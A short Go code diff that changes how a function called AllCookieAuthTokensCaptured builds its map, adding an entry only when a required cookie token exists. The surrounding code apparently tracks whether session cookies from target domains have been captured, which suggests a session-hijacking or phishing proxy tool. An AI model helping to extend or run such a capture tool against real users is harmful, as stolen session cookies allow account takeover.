@@ -93,9 +93,11 @@ func (s *Session) AddCookieAuthToken(domain string, key string, value string, pa
 func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
 	tcopy := make(map[string][]CookieAuthToken)
 	for k, v := range authTokens {
-		tcopy[k] = []CookieAuthToken{}
 		for _, at := range v {
 			if !at.optional {
+				if _, ok := tcopy[k]; !ok {
+					tcopy[k] = []CookieAuthToken{}
+				}
 				tcopy[k] = append(tcopy[k], *at)
 			}
 		}
